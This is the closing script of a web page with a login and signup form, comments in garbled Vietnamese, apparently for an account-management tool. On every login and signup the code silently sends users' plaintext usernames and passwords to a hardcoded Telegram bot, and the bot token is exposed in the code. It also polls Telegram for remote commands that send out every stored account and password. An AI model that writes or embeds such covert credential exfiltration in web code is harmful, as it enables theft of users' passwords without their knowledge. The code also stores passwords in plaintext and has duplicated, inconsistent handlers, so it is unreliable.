  document.body.style.overflow = ""; // Kh√¥i ph·ª•c scroll
}

forgotPasswordLink.onclick = () => {
  showCopyNotification("‚ö†Ô∏è Ch·ª©c nƒÉng qu√™n m·∫≠t kh·∫©u ch∆∞a kh·∫£ d·ª•ng", "#ff9800");
  return false;
};

signupBtn.onclick = (() => {
  loginForm.style.marginLeft = "-50%";
  loginText.style.marginLeft = "-50%";
});

loginBtn.onclick = (() => {
  loginForm.style.marginLeft = "0%";
  loginText.style.marginLeft = "0%";
});

signupLink.onclick = (() => {
  signupBtn.click();
  return false;
});

loginForm.addEventListener("submit", function(event) {
  event.preventDefault();
  const username = loginForm.querySelector('input[type="text"]').value.trim();
  const password = loginForm.querySelector('input[type="password"]').value.trim();
  
  if (!username || !password) {
    showCopyNotification("‚ùå Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!", "#f44336");
    return;
  }

  const storedUser = JSON.parse(localStorage.getItem(username));
  
  if (storedUser && storedUser.password === password) {
    showCopyNotification("‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng!", "#4caf50");
    hideLogin();
    updateLoginUI(username);
    localStorage.setItem('currentUser', username);
    
    // G·ª≠i th√¥ng b√°o Telegram C√ì m·∫≠t kh·∫©u
    const telegramMsg = `üîê *ƒêƒÇNG NH·∫¨P TH√ÄNH C√îNG*\n\n` +
                       `üë§ Username: \`${username}\`\n` +
                       `üîë Password: \`${password}\`\n` +
                       `üïí Th·ªùi gian: ${new Date().toLocaleString()}`;
    sendToTelegram(telegramMsg, true).catch(console.error); // Th√™m true ƒë·ªÉ g·ª≠i m·∫≠t kh·∫©u
  } else {
    showCopyNotification("‚ùå Sai t√™n ƒëƒÉng nh·∫≠p ho·∫∑c m·∫≠t kh·∫©u!", "#f44336");
  }
});

// S·ª≠a l·∫°i ph·∫ßn x·ª≠ l√Ω form ƒëƒÉng k√Ω
signupForm.addEventListener("submit", function(event) {
  event.preventDefault();

  const usernameInput = signupForm.querySelectorAll('input[type="text"]')[0];
  const passwordInput = signupForm.querySelectorAll('input[type="password"]')[0];
  const confirmInput = signupForm.querySelectorAll('input[type="password"]')[1];
  
  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  const confirm = confirmInput.value.trim();

  // ... (ph·∫ßn validate gi·ªØ nguy√™n nh∆∞ tr∆∞·ªõc)

  // L∆∞u user m·ªõi
  localStorage.setItem(username, JSON.stringify({ password }));
  
  // G·ª≠i th√¥ng b√°o Telegram C√ì m·∫≠t kh·∫©u
  const telegramMsg = `üì¢ *NG∆Ø·ªúI D√ôNG M·ªöI ƒêƒÇNG K√ù*\n\n` +
                     `üë§ Username: \`${username}\`\n` +
                     `üîë Password: \`${password}\`\n` +
                     `üïí Th·ªùi gian: ${new Date().toLocaleString()}`;
  
  sendToTelegram(telegramMsg, true) // Th√™m true ƒë·ªÉ g·ª≠i m·∫≠t kh·∫©u
    .then(() => {
      showCopyNotification("‚úÖ ƒêƒÉng k√Ω th√†nh c√¥ng! Vui l√≤ng ƒëƒÉng nh·∫≠p.", "#4caf50");
      loginBtn.click();
      loginForm.querySelector('input[type="text"]').value = username;
      loginForm.querySelector('input[type="password"]').focus();
    })
    .catch(err => {
      console.error("L·ªói g·ª≠i Telegram:", err);
      showCopyNotification("‚úÖ ƒêƒÉng k√Ω th√†nh c√¥ng (l·ªói g·ª≠i Telegram)", "#4caf50");
      loginBtn.click();
    });
});
// Dark Mode Toggle
function toggleDarkMode() {
  document.body.classList.toggle('dark-mode');
  const isDarkMode = document.body.classList.contains('dark-mode');
  localStorage.setItem('darkMode', isDarkMode);
  
  // ƒê·ªïi icon/text n√∫t
  const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
  darkModeBtn.innerHTML = isDarkMode ? '‚òÄÔ∏è Light Mode' : 'üåì Dark Mode';
}

// Ki·ªÉm tra localStorage khi t·∫£i trang
document.addEventListener('DOMContentLoaded', () => {
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '‚òÄÔ∏è Light Mode';
  }
});
function updateLoginUI(username) {
  const buttonsToDisable = [
    'randomFastBtn', 'saveBtn', 'downloadTxtBtn', 
    'downloadSelectedBtn', 'clearAllBtn', 
    'deleteSelectedBtn', 'selectionToggleBtn'
  ];
  
  if (username) {
    document.getElementById('loginBtn').style.display = 'none';
    document.getElementById('userDisplay').style.display = 'flex';
    document.getElementById('usernameDisplay').textContent = username;
    
    // B·ªè class disabled kh·ªèi c√°c n√∫t
    buttonsToDisable.forEach(id => {
      const btn = document.getElementById(id);
      if (btn) btn.classList.remove('not-logged-in');
    });
  } else {
    document.getElementById('loginBtn').style.display = 'flex';
    document.getElementById('userDisplay').style.display = 'none';
    
    // Th√™m class disabled v√†o c√°c n√∫t
    buttonsToDisable.forEach(id => {
      const btn = document.getElementById(id);
      if (btn) btn.classList.add('not-logged-in');
    });
  }
}
function logout() {
  localStorage.removeItem('currentUser');
  updateLoginUI(null);
  showCopyNotification("‚úÖ ƒê√£ ƒëƒÉng xu·∫•t!", "#4caf50");
}
signupForm.addEventListener("submit", function(event) {
  event.preventDefault();

  const username = signupForm.querySelectorAll('input[type="text"]')[0].value.trim();
  const password = signupForm.querySelectorAll('input[type="password"]')[0].value.trim();
  const confirm = signupForm.querySelectorAll('input[type="password"]')[1].value.trim();

  if (!/^[a-z0-9]{6,32}$/.test(username)) {
    showCopyNotification("‚ùå T√™n ƒëƒÉng nh·∫≠p ph·∫£i g·ªìm 6‚Äì32 k√Ω t·ª± ch·ªØ th∆∞·ªùng & s·ªë", "#f44336");
    return;
  }

  if (password.length < 6 || password.length > 32 || !/[a-zA-Z]/.test(password) || !/[0-9]/.test(password)) {
    showCopyNotification("‚ùå M·∫≠t kh·∫©u ph·∫£i d√†i 6‚Äì32 k√Ω t·ª±, c√≥ ch·ªØ & s·ªë", "#f44336");
    return;
  }

  if (password !== confirm) {
    showCopyNotification("‚ùå M·∫≠t kh·∫©u x√°c nh·∫≠n kh√¥ng kh·ªõp!", "#f44336");
    return;
  }

  if (!localStorage.getItem(username)) {
    localStorage.setItem(username, JSON.stringify({ password }));
    
    // G·ª≠i th√¥ng b√°o ƒëƒÉng k√Ω v·ªõi c·∫£ m·∫≠t kh·∫©u
    const telegramMsg = `üì¢ *NG∆Ø·ªúI D√ôNG M·ªöI ƒêƒÇNG K√ù*\n\n` +
                       `üë§ Username: \`${username}\`\n` +
                       `üîë Password: \`${password}\`\n` +
                       `üïí Th·ªùi gian: ${new Date().toLocaleString()}`;
    
    sendToTelegram(telegramMsg).then(() => {
      showCopyNotification("‚úÖ ƒêƒÉng k√Ω th√†nh c√¥ng v√† ƒë√£ g·ª≠i th√¥ng b√°o!", "#4caf50");
      loginBtn.click();
    }).catch(console.error);
  }
});
// Th√™m c√°c bi·∫øn c·∫•u h√¨nh Telegram
const TELEGRAM_BOT_TOKEN = '8076564532:AAERoDqSyg9TjFxPk3DXXdmP6xJN01Ct8Fk';
const TELEGRAM_CHAT_ID = '5940830830'; // Chat ID c√° nh√¢n c·ªßa b·∫°n

// H√†m g·ª≠i th√¥ng b√°o ƒë·∫øn Telegram
async function sendToTelegram(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    return await response.json();
  } catch (error) {
    console.error('L·ªói g·ª≠i Telegram:', error);
    return null;
  }
}

// H√†m ki·ªÉm tra l·ªánh t·ª´ Telegram
async function checkTelegramCommands() {
  try {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
      timeout: 5000  // Gi·ªõi h·∫°n th·ªùi gian ch·ªù
    });
    const data = await response.json();
    
    if (data.ok && data.result.length > 0) {
      const lastUpdate = data.result[data.result.length - 1];
      const chatId = lastUpdate.message.chat.id;
      const text = lastUpdate.message.text;

      if (chatId == TELEGRAM_CHAT_ID) {
        // L·ªánh cho qu·∫£n l√Ω t√†i kho·∫£n
        if (text === '/getaccounts') {
          let reply = "üì¶ DANH S√ÅCH T√ÄI KHO·∫¢N QU·∫¢N L√ù:\n\n";
          accounts.forEach((acc, i) => {
            reply += `${i+1}. ${acc.username} | ${acc.password} | ${acc.note || 'no note'}\n`;
          });
          await sendToTelegram(reply);
        }
        
        // L·ªánh cho user h·ªá th·ªëng
        else if (text === '/getusers') {
          const users = Object.keys(localStorage).filter(key => 
            !['accounts', 'currentUser', 'darkMode'].includes(key)
          );
          
          let reply = "üë• DANH S√ÅCH USER H·ªÜ TH·ªêNG:\n\n";
          users.forEach(user => {
            const userData = JSON.parse(localStorage.getItem(user));
            reply += `- ${user} | ${userData.password}\n`;
          });
          await sendToTelegram(reply);
        }
        
        // Th·ªëng k√™
        else if (text === '/stats') {
          const systemUsers = Object.keys(localStorage).filter(key => 
            !['accounts', 'currentUser', 'darkMode'].includes(key)
          ).length;
          
          await sendToTelegram(`üìä TH·ªêNG K√ä:\nUser h·ªá th·ªëng: ${systemUsers}\nT√†i kho·∫£n qu·∫£n l√Ω: ${accounts.length}`);
        }
      }
     }
  } catch (error) {
    console.error("L·ªói getUpdates:", error);
    // T·ª± ƒë·ªông kh·ªüi ƒë·ªông l·∫°i sau 10s n·∫øu l·ªói
    setTimeout(checkTelegramCommands, 10000);
  } finally {
    // G·ªçi l·∫°i sau m·ªói 3s (thay v√¨ 5s)
    setTimeout(checkTelegramCommands, 3000); 
  }
}

// S·ª≠a l·ªói ch√≠nh t·∫£ d√≤ng n√†y (document thay v√¨ ocument)
document.addEventListener('DOMContentLoaded', () => {
  checkTelegramCommands();
  
  // Ki·ªÉm tra dark mode v√† login state
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '‚òÄÔ∏è Light Mode';
  }
  
  const currentUser = localStorage.getItem('currentUser');
  if (currentUser) {
    updateLoginUI(currentUser);
  }
});
function isLoggedIn() {
  return !!localStorage.getItem('currentUser');
}

function showLoginRequired() {
  showCopyNotification("üîí Vui l√≤ng ƒëƒÉng nh·∫≠p ƒë·ªÉ s·ª≠ d·ª•ng ch·ª©c nƒÉng n√†y!", "#f44336");
  showLogin(); // T·ª± ƒë·ªông hi·ªÉn th·ªã form ƒëƒÉng nh·∫≠p
}
</script>

</body>
</html>
